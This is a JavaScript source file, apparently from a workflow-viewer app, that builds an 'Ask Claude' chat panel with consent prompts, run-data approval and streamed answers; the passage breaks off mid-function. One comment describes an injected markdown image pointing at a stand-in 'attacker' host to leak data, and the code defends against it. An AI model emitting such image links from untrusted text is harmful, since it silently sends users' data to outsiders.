// Ask Claude: questions about the whole instance, one workflow, or one failure, answered by the person's own Claude
// Code with no tools. The newest answer sits right under the question box and types itself out as it streams.
// Before the first question, Flowdeck says exactly what leaves the machine and waits for a yes.

import { div, PathBuilder, Background } from "gpui-kit";
import { h_flex, v_flex, Textarea, TextView } from "gpui-base";
import { shared, setShared } from "herdr";
import { alpha, icon, button, chip, spinner, rise, mono, card, dot } from "./ui.js";
import { buildContext, buildPrompt, SYSTEM_PROMPT, lastMentioned, mentionsInOrder, culpritIn, safeMarkdown, answerLinkAllowed, quotedNeedle, mentionScore, runEvidence, running, when, splitSummary } from "./model.js";
import { MODELS, startAsk, readAsk, cancelAsk, cleanupAsk } from "./claude.js";
import { graphView, GraphState } from "./graph.js";
import { randomBytes } from "crypto";

const CONSENT = "flowdeck.ask-consent";
const MODEL = "flowdeck.ask-model";
const POLL = 160;
const MAX_MS = 4 * 60e3;
const WALK_MS = 700;
const RUN_SEARCH = 50;

const SUGGEST = {
  all: ["What's failing most this week, and why?", "Which workflows haven't run in the last 7 days?", "Which workflows send messages to Slack or email?", "Summarise what this instance automates, in five bullets."],
  workflow: ["Explain what this workflow does, step by step.", "What are the most likely ways this breaks?", "How can I make it more robust?", "Which credentials and outside services does it depend on?"],
  failure: ["Why did this fail?", "What exactly should I change to fix it?", "How do I stop this happening again?"],
};

export class AskSession {
  constructor() {
    this.turns = [];
    this.scope = { kind: "all", label: "All workflows" };
    this.installed = null;
    this.pending = null;
    this.job = null;
    this.task = null;
    this.seq = 0;
  }

  get model() { return MODELS.some((m) => m.id === shared(MODEL)) ? shared(MODEL) : "sonnet"; }
  get busy() { return Boolean(this.job || this.preparing); }

  reset() {
    this.cancel();
    this.turns = [];
    this.scope = { kind: "all", label: "All workflows" };
    this.pending = null;
  }

  async cancel() {
    // A run search or a pending "send run data?" ends too, answered no.
    this.preparing = false;
    const waiting = this.turns[0]?.a;
    if (waiting?.confirm) { waiting.confirm(false); waiting.stopped = true; }
    if (waiting?.searching) { waiting.searching = null; waiting.stopped = true; waiting.streaming = false; }
    this.task?.cancel();
    this.task = null;
    this.walk?.cancel();
    this.walk = null;
    const job = this.job;
    this.job = null;
    if (job) {
      const t = this.turns.find((p) => p.a.job === job)?.a;
      if (t) { t.streaming = false; t.stopped = true; }
      await cancelAsk(job);
    }
  }

  // Consent is per instance and per kind of scope: saying yes for one workflow isn't saying yes to sending a summary
  // of every workflow, or to another instance.
  consented(view, scope = this.scope) {
    const all = shared(CONSENT);
    return Boolean(all && typeof all === "object" && all[view.profile?.id]?.[scope.kind === "all" ? "all" : "workflow"]);
  }

  consent(view) {
    const all = shared(CONSENT);
    const prev = all && typeof all === "object" ? all : {};
    const pid = view.profile?.id;
    setShared(CONSENT, { ...prev, [pid]: { ...(prev[pid] ?? {}), [this.scope.kind === "all" ? "all" : "workflow"]: true } });
  }

  // Exactly what would be sent for the current scope, for the preview.
  contextFor(view, scope = this.scope, extra = {}) {
    const m = view.derived();
    const workflow = scope.kind !== "all" ? m.byId.get(scope.workflowId) : null;
    const failure = scope.kind === "failure" ? m.groups.find((g) => g.latest && String(g.latest.id) === String(scope.runId)) ?? { latest: { id: scope.runId } } : null;
    return buildContext({ scope: workflow ? "workflow" : "all", workflows: view.data.workflows, stats: m.stats, groups: m.groups, runs: view.data.runs, workflow, failure, instance: view.profile?.name, ...extra });
  }

  // Looks through the newest runs (of the workflow asked about, else of the instance) for one whose data mentions the
  // quoted text: one run at a time, each read as raw text and dropped, so memory stays flat however big runs are.
  // Looks through the newest runs (of the workflow asked about, else of the instance) for the quoted text and ranks
  // every match (mentionScore), so a run that only lists the title loses to the one that made it. One run is read at
  // a time, as raw text, and dropped: only ids and scores are kept, and the chosen run is read again on a yes.
  async findRun(view, scope, needle, a, cx, exclude = null) {
    const wid = scope.kind !== "all" ? scope.workflowId : null;
    const list = view.data.executions.filter((e) => (!wid || e.workflowId === wid) && e.workflowId !== exclude && !running(e)).slice(0, RUN_SEARCH);
    a.searching = { needle, done: 0, total: list.length, hits: 0 };
    cx.notify();
    const searched = { needle, count: 0, workflow: wid ? view.derived().byId.get(wid)?.name : exclude ? "other workflows" : null };
    const hits = [];
    for (const e of list) {
      if (!this.preparing) break;
      let text = null;
      try { text = await view.source.executionText(String(e.id)); } catch {}
      searched.count++;
      const score = text ? mentionScore(text, needle) : 0;
      text = null;
      if (score) hits.push({ id: String(e.id), startedAt: e.startedAt, status: e.status, score, workflowId: e.workflowId });
      if (a.searching) { a.searching.done = searched.count; a.searching.hits = hits.length; }
      cx.notify();
    }
    a.searching = null;
    hits.sort((x, y) => y.score - x.score || Date.parse(y.startedAt) - Date.parse(x.startedAt));
    return { hits: hits.slice(0, 4), searched };
  }

  // Look further from an answer that used a run: the run before or after it in the same workflow, or runs of other
  // workflows that mention the same text. Each starts a follow-up that asks before sending, like any run.
  lookFurther(view, t, mode, cx) {
    if (this.busy || !t) return;
    const base = t.found, needle = base?.needle ?? t.searched?.needle ?? null;
    const byId = view.derived().byId;
    if ((mode === "prev" || mode === "next") && base) {
      const runs = view.data.executions.filter((e) => e.workflowId === base.workflowId && !running(e)).sort((x, y) => Date.parse(x.startedAt) - Date.parse(y.startedAt));
      const i = runs.findIndex((e) => String(e.id) === String(base.id));
      const pick = i < 0 ? null : runs[i + (mode === "next" ? 1 : -1)];
      if (!pick) { t.lookNote = mode === "next" ? "That's the newest run." : "There's no earlier run in the last 7 days."; cx.notify(); return; }
      const reason = `${mode === "prev" ? "the run before" : "the run after"} #${base.id}`;
      const wf = byId.get(pick.workflowId)?.name;
      this.ask(`Look further: ${reason} (#${pick.id})`, view, cx, {
        needle,
        hits: [{ id: String(pick.id), startedAt: pick.startedAt, status: pick.status, score: 0, workflowId: pick.workflowId, reason }],
        prompt: `Look further at run #${pick.id}, ${reason}${wf ? ` in "${wf}"` : ""}. Compare it with what you found before: does it show the same problem, or does it explain what happened?`,
      });
    } else if (mode === "elsewhere" && needle) {
      this.ask(`Look further: other workflows' runs that mention “${needle}”`, view, cx, {
        needle, elsewhere: true, excludeWorkflow: base?.workflowId ?? (this.scope.kind !== "all" ? this.scope.workflowId : null),
        prompt: `Look further: this is a run from another workflow that also mentions "${needle}". What does it add to what you found before?`,
      });
    }
  }

  // `opts`: `prompt`, the question as Claude gets it (default: as shown); `hits`, runs already chosen (Look further's
  // run before/after), skipping the search; `elsewhere` + `excludeWorkflow`, search other workflows' runs instead.
  async ask(question, view, cx, opts = {}) {
    if (this.busy) return;
    if (!this.consented(view)) { this.pending = question; this.preview = null; cx.notify(); return; }
    this.pending = null;
    const id = ++this.seq;
    const scope = { ...this.scope };
    const q = { id: `q${id}`, role: "user", text: question, scope: scope.label };
    const a = { id: `a${id}`, role: "assistant", text: "", streaming: true, scope: scope.label, model: this.model, started: Date.now() };
    // Turns are question/answer pairs, newest first; Claude is given them oldest first.
    const history = this.turns.slice().reverse().flatMap((p) => [p.q, p.a]).filter((t) => !t.error && t.text);
    this.turns.unshift({ q, a });
    cx.notify();
    if (this.installed === false) {
      a.streaming = false;
      a.error = "Ask needs Claude Code. Install it (claude.com/claude-code), sign in once with `claude`, then try again.";
      cx.notify();
      return;
    }
    try {
      // A quoted name or title: find the run that produced it, and share what it did only if the person says yes.
      const needle = opts.needle ?? quotedNeedle(question);
      let evidence = null, searched = null;
      if ((needle || opts.hits) && view.source?.executionText) {
        this.preparing = true;
        const found = opts.hits
          ? { hits: opts.hits, searched: null }
          : await this.findRun(view, opts.elsewhere ? { kind: "all" } : scope, needle, a, cx, opts.excludeWorkflow);
        searched = found.searched;
        if (found.hits.length && this.preparing) {
          const named = (h) => ({ ...h, workflowName: opts.elsewhere ? view.derived().byId.get(h.workflowId)?.name ?? null : null });
          a.candidates = found.hits.map(named);
          a.found = { ...a.candidates[0], needle, picked: Boolean(opts.hits) };
          cx.notify();
          const yes = await new Promise((resolve) => { a.confirm = resolve; });
          a.confirm = null;
          a.found.shared = yes;
          if (yes) {
            const wf = view.derived().byId.get(a.found.workflowId);
            try { evidence = { ...runEvidence(await view.source.executionText(a.found.id)), needle, workflow: wf?.name ?? null, reason: a.found.reason ?? null }; } catch { a.found.shared = false; }
          }
          if (searched) searched = { ...searched, found: true };
        }
        const stopped = !this.preparing;
        this.preparing = false;
        if (stopped || a.stopped) { a.streaming = false; a.stopped = true; cx.notify(); return; }
        a.searched = searched;
      }
      const context = this.contextFor(view, scope, { evidence, searched });
      a.chars = context.length;
      const job = await startAsk({ prompt: buildPrompt(context, history, opts.prompt ?? question, randomBytes(6).toString("hex")), system: SYSTEM_PROMPT, model: this.model });
      a.job = job;
      this.job = job;
      a.floStep = 0;
      this.walk?.cancel();
      this.walk = cx.timer.every(WALK_MS, (cx) => {
        if (a.floStep < (a.tourLength ?? 0) - 1) { a.floStep++; cx.notify(); }
        else if (!a.streaming) { this.walk?.cancel(); this.walk = null; }
      });
      this.task = cx.timer.every(POLL, (cx) => {
        if (this.job !== job) return;
        cx.spawn(async (cx) => {
          const r = await readAsk(job);
          if (this.job !== job) return;
          const news = r.text !== a.text || r.done;
          a.text = r.text;
          const late = Date.now() - job.started > MAX_MS;
          if (r.done || late) {
            a.streaming = false;
            a.error = late && !r.done ? "Claude took too long to answer." : r.error;
            a.cost = r.cost;
            a.ms = Date.now() - job.started;
            this.task?.cancel();
            this.task = null;
            this.job = null;
            if (late && !r.done) await cancelAsk(job); else await cleanupAsk(job);
          }
          if (news) cx.notify();
        });
      });
    } catch (e) {
      a.streaming = false;
      a.error = String(e?.message ?? e);
      this.job = null;
      cx.notify();
    }
  }
}

function scopeBar(view, c) {
  const s = view.asking.scope, m = view.derived();
  const wf = view.sel.workflowId ? m.byId.get(view.sel.workflowId) : null;
  const set = (scope) => (_e, cx) => { view.asking.scope = scope; cx.notify(); };
  return h_flex().gap(6).items_center().flex_wrap()
    .child(div().text_size(11.5).text_color(c.dim).mr(2).child("About"))
    .child(chip(c, { id: "sc-all", label: "All workflows", iconName: "grid", active: s.kind === "all", onClick: set({ kind: "all", label: "All workflows" }) }))
    .when(Boolean(wf) && !(s.kind === "workflow" && s.workflowId === wf?.id), (e) => e.child(chip(c, { id: "sc-wf", label: wf.name.slice(0, 32), iconName: "flow", active: false, onClick: set({ kind: "workflow", workflowId: wf.id, label: wf.name }) })))
    .when(s.kind === "workflow", (e) => e.child(chip(c, { id: "sc-cur", label: s.label.slice(0, 40), iconName: "flow", active: true })))
    .when(s.kind === "failure", (e) => e.child(chip(c, { id: "sc-fail", label: s.label.slice(0, 44), iconName: "alert", color: c.err, active: true })));
}

function modelPicker(view, c) {
  const cur = view.asking.model;
  return h_flex().gap(2).p(2).rounded(8).bg(alpha(c.foreground, 0.05)).children(MODELS.map((m) => h_flex().id(`model-${m.id}`).h(24).px(9).items_center().rounded(6).cursor_pointer()
    .text_size(11.5).text_color(cur === m.id ? c.foreground : c.dim).bg(cur === m.id ? c.raised : "#00000000").tooltip(`Claude ${m.label}: ${m.note}`)
    .on_click((_e, cx) => { setShared(MODEL, m.id); cx.notify(); }).child(m.label)));
}

function consentCard(view, c) {
  const s = view.asking.scope;
  const what = s.kind === "all" ? "a summary of every workflow (names, node types, run counts and recent errors)" : `the "${s.label}" workflow: its nodes, their settings and its recent errors`;
  return card(c).id("consent").p(18).gap(12).border_color(alpha(c.brand, 0.5)).map(rise(true, 0))
    .child(h_flex().gap(10).items_center().child(icon("shield", 17, c.brand)).child(div().flex_1().min_w(0).text_size(14).font_semibold().child("Before your first question")))
    .child(div().text_size(12.8).text_color(c.foreground).child(`To answer, Flowdeck sends ${what} from ${view.profile?.name ?? "this instance"} to Claude, through your own Claude Code sign-in. You'll be asked again for other instances, and before sending a summary of every workflow.`))
    .child(v_flex().gap(6)
      .child(h_flex().gap(8).items_start().child(icon("check", 13, c.ok).mt(2)).child(div().flex_1().min_w(0).text_size(12.3).text_color(c.muted).child("Never sent: credentials or pinned data. What a run processed only goes if you approve it, one question at a time.")))
      .child(h_flex().gap(8).items_start().child(icon("check", 13, c.ok).mt(2)).child(div().flex_1().min_w(0).text_size(12.3).text_color(c.muted).child("Fields named like secrets, and values that look like keys or tokens, are masked first.")))
      .child(h_flex().gap(8).items_start().child(icon("check", 13, c.ok).mt(2)).child(div().flex_1().min_w(0).text_size(12.3).text_color(c.muted).child("Claude runs with every tool switched off: it can read what's sent and write an answer, nothing else."))))
    .child(h_flex().gap(8).pt(2).flex_wrap()
      .child(button(c, { id: "consent-yes", label: "Ask Claude", iconName: "spark", kind: "primary", onClick: (_e, cx) => { view.asking.consent(view); const q = view.asking.pending; view.asking.pending = null; view.asking.preview = null; if (q) view.ask(q, cx); } }))
      .child(button(c, { id: "consent-see", label: view.asking.preview ? "Hide what's sent" : "See exactly what's sent", iconName: "eye", kind: "ghost", onClick: (_e, cx) => {
        view.asking.preview = view.asking.preview ? null : view.asking.contextFor(view);
        cx.notify();
      } }))
      .child(button(c, { id: "consent-no", label: "Not now", kind: "subtle", onClick: (_e, cx) => { view.asking.pending = null; view.asking.preview = null; cx.notify(); } })))
    .when(Boolean(view.asking.preview), (e) => e.child(div().id("consent-preview").max_h(260).overflow_y_scrollbar().p(10).rounded(8).bg(c.background).border(1).border_color(c.border)
      .text_size(11).font_family(mono()).text_color(c.muted).child(String(view.asking.preview).slice(0, 20000))));
}

// The answer's one-line summary, on a card with colour flowing slowly behind it: four gradient panels in a strip
// twice the card's width, swinging side to side natively (no timer), under a scrim that keeps the words readable.
const FLOW_W = 520, FLOW_H = 220;
let flowPaths = null;
function flowStrip(c) {
  if (!flowPaths) {
    const cols = ["#ff7a5c", "#8b5cf6", "#22d3ee", "#ff9fb0", "#ff7a5c"];
    flowPaths = cols.slice(0, -1).map((from, i) => {
      const rect = PathBuilder.fill().add_polygon([[i * FLOW_W, 0], [(i + 1) * FLOW_W, 0], [(i + 1) * FLOW_W, FLOW_H], [i * FLOW_W, FLOW_H]], true).build();
      return [rect, Background.linear_gradient(90, Background.stop(from, 0), Background.stop(cols[i + 1], 100))];
    });
  }
  return div().absolute().top(0).left(0).w(FLOW_W * 4).h(FLOW_H).loop("left", { from: 0, to: -FLOW_W * 2, period: 16000, easing: "ease-in-out" })
    .children(flowPaths.map(([rect, bg]) => window.paint_path(rect, bg).absolute().top(0).left(0).w(FLOW_W * 4).h(FLOW_H)));
}

function summaryCard(c, text, streaming, id) {
  return div().id(`tldr-${id}`).relative().w_full().rounded(11).overflow_hidden().border(1).border_color(alpha(c.brand, 0.45))
    .child(flowStrip(c).opacity(c.dark ? 0.32 : 0.22))
    .child(div().absolute().top(0).left(0).size_full().bg(alpha(c.surface, c.dark ? 0.55 : 0.6)))
    .child(h_flex().relative().px(14).py(11).gap(10).items_start()
      .child(div().flex_none().mt(1).px(6).h(17).rounded(5).flex().items_center().bg(alpha(c.foreground, 0.12)).text_size(9.5).font_bold().text_color(c.foreground).child("TL;DR"))
      .child(div().flex_1().min_w(0).text_size(13.5).font_medium().text_color(c.foreground).child(streaming && !text.endsWith(".") ? `${text} ▍` : text)));
}

// The run search's part of an answer: progress, the "send this run's data?" question, and what came of it.
function runSearch(c, t) {
  const quote = (n) => `“${n.length > 60 ? `${n.slice(0, 60)}…` : n}”`;
  if (t.searching) {
    const { needle, done, total } = t.searching;
    return h_flex().gap(9).items_center().child(spinner(13, c.run))
      .child(div().flex_1().min_w(0).text_size(12.3).text_color(c.muted).child(`Searching recent runs for ${quote(needle)} · ${done}/${total}${t.searching.hits ? ` · ${t.searching.hits} mention it` : ""}`));
  }
  if (t.found && t.confirm) {
    const f = t.found;
    return v_flex().id(`found-${t.id}`).p(12).gap(10).rounded(10).bg(alpha(c.run, 0.08)).border(1).border_color(alpha(c.run, 0.4))
      .child(h_flex().gap(8).items_start().child(icon("search", 13, c.run).mt(2))
        .child(div().flex_1().min_w(0).text_size(12.5).text_color(c.foreground).child(f.picked
          ? `Run #${f.id}, ${when(Date.parse(f.startedAt))}: ${f.reason}.`
          : `Best match: run #${f.id}${f.workflowName ? ` in ${f.workflowName}` : ""}, ${when(Date.parse(f.startedAt))}, which mentions ${quote(f.needle)}${f.score > 1 ? ` (${f.score >= 5 ? "as a field value" : `${f.score} times`})` : ""}.`)))
      .when((t.candidates ?? []).length > 1, (e) => e.child(h_flex().gap(6).items_center().flex_wrap()
        .child(div().text_size(11.5).text_color(c.dim).child("Or pick another run that mentions it:"))
        .children(t.candidates.map((cand) => chip(c, { id: `cand-${t.id}-${cand.id}`, label: `#${cand.id} · ${when(Date.parse(cand.startedAt))}`, active: cand.id === f.id,
          onClick: (_e, cx) => { t.found = { ...cand, needle: f.needle }; cx.notify(); } })))))
      .child(div().text_size(12).text_color(c.muted).child("To work out what happened, Claude needs what that run's nodes produced: the first two items each node output, with secrets masked, up to 40 KB. It's sent for this question only."))
      .child(h_flex().gap(8).flex_wrap()
        .child(button(c, { id: `share-${t.id}`, label: "Send run data", iconName: "spark", kind: "primary", size: "sm", onClick: (_e, cx) => { t.confirm?.(true); cx.notify(); } }))
        .child(button(c, { id: `noshare-${t.id}`, label: "Answer without it", size: "sm", onClick: (_e, cx) => { t.confirm?.(false); cx.notify(); } })));
  }
  if (t.found) {
    return h_flex().gap(7).items_center().child(icon(t.found.shared ? "check" : "eye-off", 12, t.found.shared ? c.ok : c.dim))
      .child(div().text_size(11.5).text_color(c.dim).child(t.found.shared ? `Shared what run #${t.found.id}'s nodes produced` : `Answered without run #${t.found.id}'s data`));
  }
  if (t.searched && !t.searched.found) {
    return h_flex().gap(7).items_center().child(icon("search", 12, c.dim))
      .child(div().text_size(11.5).text_color(c.dim).child(`No run in the last ${t.searched.count} mentions ${quote(t.searched.needle)}`));
  }
  return null;
}

// Look further, under an answer that used a run (or searched for one): the run before, the run after, or the same
// text in other workflows.
let lookHandler = () => {};
function lookRow(c, t) {
  if (t.streaming || t.error || (!t.found && !t.searched)) return null;
  const needle = t.found?.needle ?? t.searched?.needle;
  const opt = (mode, label, iconName, show) => (show ? chip(c, { id: `look-${mode}-${t.id}`, label, iconName, active: false, onClick: (_e, cx) => lookHandler(t, mode, cx) }) : null);
  const chips = [
    opt("prev", "← Run before", null, Boolean(t.found)),
    opt("next", "Run after →", null, Boolean(t.found)),
    opt("elsewhere", "Other workflows", "flow", Boolean(needle)),
  ].filter(Boolean);
  if (!chips.length) return null;
  return v_flex().gap(6).pt(4).border_t(1).border_color(c.border)
    .child(h_flex().gap(6).items_center().flex_wrap()
      .child(div().text_size(11.5).font_medium().text_color(c.muted).mr(2).child("Look further:"))
      .children(chips))
    .when(Boolean(t.lookNote), (e) => e.child(div().text_size(11.3).text_color(c.dim).child(t.lookNote)));
}

function answer(c, t, i) {
  const md = t.text || "";
  const parts = splitSummary(md);
  const search = runSearch(c, t);
  const thinking = t.streaming && !md && !t.searching && !t.confirm;
  return v_flex().id(`turn-${t.id}`).gap(10).p(16).rounded(14).bg(c.surface).border(1).border_color(t.error ? alpha(c.err, 0.4) : i === 0 && t.streaming ? alpha(c.brand, 0.5) : c.border)
    .map(rise(true, 0, 6))
    .child(h_flex().gap(9).items_center()
      .child(h_flex().size(24).rounded(7).items_center().justify_center().bg(alpha(c.brand, 0.16)).child(t.streaming ? spinner(13, c.brand) : icon("spark", 13, c.brand)))
      .child(div().text_size(12).font_semibold().child("Claude"))
      .child(div().text_size(11).text_color(c.dim).child(`${MODELS.find((m) => m.id === t.model)?.label ?? ""} · ${t.scope}`))
      .child(div().flex_1())
      .when(!t.streaming && t.ms, (e) => e.child(div().text_size(10.8).text_color(c.dim).font_family(mono()).child(`${(t.ms / 1000).toFixed(1)} s${t.cost ? ` · $${t.cost.toFixed(4)}` : ""}`))))
    .when(Boolean(search), (e) => e.child(search))
    .when(thinking, (e) => e.child(h_flex().gap(8).items_center().h(22)
      .child(div().text_size(12.5).text_color(c.muted).child("Reading your workflows"))
      .child(div().w(24).text_size(12.5).text_color(c.brand).frames(["·", "··", "···", " ··", "  ·", ""], 180).child(""))))
    .when(Boolean(parts.summary), (e) => e.child(summaryCard(c, parts.summary, t.streaming && !parts.rest, t.id)))
    .when(Boolean(parts.rest), (e) => e.child(TextView.markdown(`md-${t.id}`, safeMarkdown(t.streaming ? `${parts.rest} ▍` : parts.rest)).selectable(true).text_size(13).text_color(c.foreground)
      .on_link_click((url) => openSafe(url))))
    .when(Boolean(t.error), (e) => e.child(h_flex().gap(8).items_start().child(icon("alert", 13, c.err)).child(div().flex_1().text_size(12.5).text_color(c.err).child(t.error))))
    .when(Boolean(t.stopped), (e) => e.child(div().text_size(11.5).text_color(c.dim).child("Stopped.")))
    .map((e) => { const row = lookRow(c, t); return row ? e.child(row) : e; });
}

const question = (c, t) => h_flex().id(`turn-${t.id}`).justify_end().child(div().max_w("80%").px(14).py(9).rounded(14).bg(alpha(c.brand, 0.14)).border(1).border_color(alpha(c.brand, 0.3))
  .text_size(13).text_color(c.foreground).child(t.text));

// An answer is written by a model that read untrusted workflow text. Before it's drawn, images and raw HTML go: a
// picture loads without a click, so an injected ![](https://attacker/?data=…) would be a silent leak. Code is left as
// written. Links only open to the person's own workflow and execution pages, or n8n's docs: never a webhook or form
// URL on their instance, which a click would run.
let openSafe = () => {};
const makeOpenSafe = (view) => (url) => {
  const ok = answerLinkAllowed(url, view.profile?.base);
  if (ok === "external") view.openExternal(String(url));
  else if (ok === "instance") view.openLink(String(url));
};

export function askView(view, c) {
  openSafe = makeOpenSafe(view);
  lookHandler = (t, mode, cx) => view.lookFurther(t, mode, cx);
  const s = view.asking, en = Boolean(view.entered.ask);
  const busy = s.busy;
  const sug = SUGGEST[s.scope.kind] ?? SUGGEST.all;
  const composer = v_flex().gap(10).p(14).rounded(14).bg(c.surface).border(1).border_color(busy ? alpha(c.brand, 0.5) : c.border).shadow_md()
    .child(scopeBar(view, c))
    .child(h_flex().gap(10).items_end()
      .child(div().id("ask-input").flex_1().min_w(0).py(4).cursor_text().on_mouse_down("left", (_e, cx) => cx.stop_propagation())
        .child(Textarea.new(view.inputs.ask).w_full().text_size(14).text_color(c.foreground)))
      .child(busy
        ? button(c, { id: "ask-stop", iconName: "stop", kind: "solid", tooltip: "Stop", onClick: (_e, cx) => cx.spawn(async (cx) => { await s.cancel(); cx.notify(); }) })
        : button(c, { id: "ask-send", iconName: "send", kind: "primary", tooltip: "Ask (Enter)", onClick: (_e, cx) => view.askCurrent(cx) })))
    .child(h_flex().justify_between().items_center().gap(10)
      .child(h_flex().gap(6).items_center().min_w(0).child(icon("lock", 11, c.dim))
        .child(div().truncate().text_size(11).text_color(c.dim).child("Sent to Claude through your Claude Code: workflow structure and errors. Run data only when you approve it.")))
      .child(modelPicker(view, c)));
  const turns = s.turns;
  const focus = claudeFocus(view);
  const width = view.size?.width ?? 0;
  const side = focus && width >= 960;
  const panelW = width >= 1320 ? 440 : 360;
  const maxW = side ? 780 : 860;
  // The question box stays put above the conversation, so a follow-up is always one click away however far down
  // the last answer has been read.
  return h_flex().id("ask").size_full().items_start()
    .child(v_flex().id("ask-col").flex_1().min_w(0).h_full()
    .child(h_flex().flex_none().w_full().justify_center().px(20).pt(16).pb(10).border_b(1).border_color(turns.length ? c.border : "#00000000")
      .child(div().w_full().max_w(maxW).child(composer.map(rise(en, 0, 8))).when(turns.length > 0 && !busy, (e) => e.child(h_flex().pt(6).gap(8).items_center()
        .child(icon("chat", 11, c.dim)).child(div().flex_1().text_size(11).text_color(c.dim).child("Ask a follow-up: Claude remembers this conversation."))
        .child(button(c, { id: "ask-clear", label: "New conversation", size: "sm", kind: "subtle", onClick: (_e, cx) => { s.turns = []; cx.notify(); } }))))))
    .child(v_flex().id("ask-scroll").flex_1().min_h(0).w_full().overflow_y_scrollbar().items_center()
    .child(v_flex().w_full().max_w(maxW).px(20).pt(14).pb(20).gap(14)
      .when(Boolean(s.pending), (e) => e.child(consentCard(view, c)))
      .when(s.installed === false, (e) => e.child(h_flex().px(12).py(9).gap(9).items_center().rounded(9).bg(alpha(c.warn, 0.1)).border(1).border_color(alpha(c.warn, 0.4))
        .child(icon("alert", 13, c.warn)).child(div().flex_1().min_w(0).text_size(12.3).child("Claude Code isn't installed here. Ask uses it to answer; everything else works without it."))))
      .when(!turns.length && !s.pending, (e) => e.child(v_flex().pt(18).gap(14).map(rise(en, 100, 8))
        .child(v_flex().items_center().gap(8)
          .child(h_flex().size(46).rounded(14).items_center().justify_center().bg(alpha(c.brand, 0.14)).child(icon("spark", 22, c.brand)))
          .child(div().text_size(16).font_semibold().child(s.scope.kind === "all" ? "Ask about your workflows" : `Ask about ${s.scope.label}`))
          .child(div().text_size(12.5).text_color(c.muted).child("Claude reads the structure and recent errors, then answers. Try one of these:")))
        .child(h_flex().flex_wrap().gap(10).justify_center().children(sug.map((q, i) => h_flex().id(`sug-${i}`).flex_1().min_w(280).px(14).py(11).gap(10).items_center().rounded(11)
          .bg(c.surface).border(1).border_color(c.border).cursor_pointer().hover((st) => st.border_color(alpha(c.brand, 0.6)).bg(c.hover))
          .map(rise(en, 160 + i * 60, 8))
          .on_click((_e, cx) => view.ask(q, cx))
          .child(icon("spark", 13, c.brand)).child(div().flex_1().min_w(0).text_size(12.8).child(q)).child(icon("chevron", 12, c.dim)))))))
      .children(turns.map((p, i) => v_flex().id(`pair-${p.q.id}`).gap(10).child(question(c, p.q)).child(answer(c, p.a, i)))))))
    .when(Boolean(side), (e) => e.child(focusPanel(view, c, focus, panelW)));
}

// What Claude is looking at, worked out from the answer as it streams: the workflow it last named (or the one asked
// about), and the node of that workflow it last named. Flo stands there.
export function claudeFocus(view, onlyWorkflow = null) {
  const s = view.asking, m = view.derived();
  const a = s.turns[0]?.a;
  const text = a?.text ?? "";
  const scope = s.scope;
  let wf = scope.kind !== "all" ? m.byId.get(scope.workflowId) : null;
  if (!wf && text) {
    const name = lastMentioned(text, view.data.workflows.map((w) => w.name));
    wf = view.data.workflows.find((w) => w.name === name) ?? null;
  }
  if (!wf || !(wf.nodes ?? []).length) return null;
  if (onlyWorkflow && wf.id !== onlyWorkflow) return null;
  // Flo walks the nodes in the order Claude names them, one hop per tick of the session's walk timer, however fast
  // the text itself arrives.
  const tour = mentionsInOrder(text, wf.nodes.map((n) => n.name));
  if (a) a.tourLength = tour.length;
  let node = tour.length ? tour[Math.min(a?.floStep ?? 0, tour.length - 1)] : null;
  const failing = scope.kind === "failure" ? view.data.runs.get(String(scope.runId))?.node : null;
  const named = Boolean(node);
  node = node ?? failing ?? (wf.nodes.find((n) => /trigger|webhook/i.test(n.type)) ?? wf.nodes[0]).name;
  const walking = Boolean(a) && (a.floStep ?? 0) < tour.length - 1;
  const busy = Boolean(a?.streaming) || walking;
  // Once the answer is in and Flo has walked it, Flo goes to the node the answer blames (or, asked about a failure
  // without blaming a node, the one that failed) and raises the alarm there.
  const culprit = !busy && a && !a.error ? culpritIn(text, wf.nodes.map((n) => n.name)) ?? failing : null;
  if (culprit) node = culprit;
  const scanning = busy && named;
  const mood = busy ? (named ? "scan" : "think") : culprit ? "error" : a?.error ? "error" : !a && failing === node ? "error" : "look";
  return {
    workflow: wf, node, mood, named, streaming: busy, scan: scanning, alert: culprit, culprit,
    step: tour.length ? Math.min(a?.floStep ?? 0, tour.length - 1) + 1 : 0, steps: tour.length,
    label: culprit ? `Likely cause: ${culprit}` : scanning ? `Scanning ${node}` : `Claude's focus: ${node}`,
  };
}

function focusPanel(view, c, f, width) {
  const key = f.workflow.id;
  if (!view.askGraph || view.askGraph.key !== key) { view.askGraph = new GraphState(); view.askGraph.key = key; view.askGraph.entered = true; view.askGraph.pad = 24; }
  const graph = view.graphOf(f.workflow);
  return v_flex().id("focus-panel").w(width).flex_none().h_full().p(16).pl(0).gap(10)
    .child(card(c).id("focus-card").flex_1().min_h(0).overflow_hidden().border_color(f.streaming ? alpha(c.brand, 0.55) : c.border)
      .child(h_flex().px(14).py(10).gap(8).items_center().border_b(1).border_color(c.border)
        .child(dot(f.streaming ? c.brand : c.dim, 7, f.streaming))
        .child(div().text_size(11).font_semibold().text_color(c.dim).child("CLAUDE'S FOCUS"))
        .child(div().flex_1())
        .child(div().max_w(220).truncate().text_size(11.5).text_color(c.muted).child(f.workflow.name)))
      .child(div().relative().flex_1().min_h(0).child(graphView(c, { id: "focus-graph", graph, state: view.askGraph, run: null, replay: null, selected: f.named ? f.node : null, active: false, focus: f, follow: true,
        onSelect: (_n, cx) => cx.notify(), onChange: (cx) => cx.notify() }))))
    .child(h_flex().px(4).gap(8).items_center()
      .child(div().text_size(12).text_color(f.culprit ? c.err : c.muted).child(f.culprit ? "Likely cause" : f.streaming ? (f.named ? "Scanning" : "Reading the workflow…") : f.named ? "Last talked about" : "Ready to look at"))
      .when(f.named || !f.streaming, (e) => e.child(div().flex_1().min_w(0).truncate().text_size(12).font_semibold().text_color(c.foreground).child(f.node)))
      .when(f.steps > 1, (e) => e.child(div().flex_none().text_size(11).font_family(mono()).text_color(c.dim).child(`${f.step}/${f.steps}`))));
}

// Ask Claude docked beside a workflow's graph: the same conversation as the Ask tab, narrower, so the answer and the
// graph are on screen together. While Claude answers, Flo scans each node it names on the big graph; when it's done,
// a strip here names the likely cause, and clicking it opens that node.
export function askDock(view, c, w) {
  openSafe = makeOpenSafe(view);
  lookHandler = (t, mode, cx) => view.lookFurther(t, mode, cx);
  const s = view.asking, busy = s.busy;
  const f = claudeFocus(view, w.id);
  const mine = s.scope.kind !== "all" && s.scope.workflowId === w.id;
  const turns = mine ? s.turns : [];
  const sug = (SUGGEST[s.scope.kind] ?? SUGGEST.workflow).slice(0, 3);
  const status = f && (f.streaming || f.culprit)
    ? h_flex().id("dock-status").mx(12).px(11).py(8).gap(9).items_center().rounded(9)
